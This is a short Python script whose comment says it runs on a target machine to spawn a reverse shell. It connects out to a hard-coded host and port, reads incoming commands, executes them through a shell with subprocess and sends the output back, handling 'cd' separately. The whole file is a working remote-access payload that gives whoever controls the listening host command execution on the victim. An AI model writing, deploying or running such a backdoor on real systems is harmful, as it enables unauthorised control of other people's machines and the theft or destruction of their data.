# will be run at the target machine from which rev shell will be spawned
import socket
import os
import subprocess

s = socket.socket()
host = '192.168.0.109'
port = 1234

s.connect((host, port))

while True:
    resp = s.recv(1024)
    data = resp.decode("utf-8")
    if data[:2] == "cd":
        os.chdir(data[3:])
    elif len(data) > 0:
        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currDir = os.getcwd() + "> "
        s.send(str.encode(output_str))